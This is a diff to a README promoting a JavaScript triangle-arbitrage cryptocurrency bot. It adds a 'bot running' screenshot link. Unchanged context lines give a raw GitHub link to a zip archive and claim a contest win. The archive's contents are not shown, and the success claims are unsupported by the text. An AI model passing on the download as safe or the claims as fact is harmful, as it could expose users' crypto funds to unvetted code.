@@ -12,7 +12,12 @@ It can be configured to run on Ethereum , BNB or Polygon Networks by changing th
  https://github.com/coolnerdcoder/javascript-triangle-arbitrage-bot-v2/raw/main/javascript-triangle-arbitrage-v2.zip
  
 <font size=5 >Here's a Youtube Video of how to config it and run it</font>
- 
+
+
+Here's the bot runnning
+
+<img src="https://raw.githubusercontent.com/coolnerdcoder/javascript-triangle-arbitrage-bot-v2/main/Screenshot 06-09-2022 08.12.42.png" >
+
 This Bot won 4th place in the annual codeoff
 
 <img src="https://raw.githubusercontent.com/coolnerdcoder/javascript-triangle-arbitrage-bot-v2/main/iwon.png" >
